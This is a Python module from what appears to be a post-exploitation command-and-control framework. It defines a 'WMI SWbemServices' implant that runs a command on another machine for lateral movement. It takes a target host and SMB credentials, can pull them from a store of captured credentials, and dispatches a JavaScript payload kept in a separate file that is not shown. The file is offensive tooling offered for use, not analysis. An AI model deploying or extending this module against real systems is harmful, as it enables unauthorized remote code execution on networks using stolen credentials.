import core.job
import core.implant

class SWbemServicesJob(core.job.Job):
    def done(self):
        self.results = "PID Start Code: %s" % self.data
        self.display()

    def display(self):
        self.shell.print_plain("PID Start Code: %s" % self.data)

class SWbemServicesImplant(core.implant.Implant):

    NAME = "WMI SWbemServices"
    DESCRIPTION = "Executes a command on another system."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/pivot/exec_wmi"

    def load(self):
        self.options.register("CMD", "hostname", "Command to run.")
        self.options.register("RHOST", "", "Name/IP of the remote.")
        self.options.register("SMBUSER", "", "Username for login.")
        self.options.register("SMBPASS", "", "Password for login.")
        self.options.register("SMBDOMAIN", ".", "Domain for login.")
        self.options.register("CREDID", "", "Cred ID from creds.")

    def job(self):
        return SWbemServicesJob

    def run(self):
        cred_id = self.options.get("CREDID")
        if cred_id:
            key = self.shell.creds_keys[int(cred_id)]
            smbuser = self.shell.creds[key]["Username"]
            smbpass = self.shell.creds[key]["Password"]
            smbdomain = self.shell.creds[key]["Domain"]
            self.options.set("SMBUSER", smbuser)
            if not smbuser:
                self.shell.print_warning("Cred has no Username!")
            self.options.set("SMBPASS", smbpass)
            if not smbpass:
                self.shell.print_warning("Cred has no Password!")
            self.options.set("SMBDOMAIN", smbdomain)
            if not smbdomain:
                self.shell.print_warning("Cred has no Domain!")

        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/pivot/exec_wmi.js", self.options)

        self.dispatch(payloads, self.job)
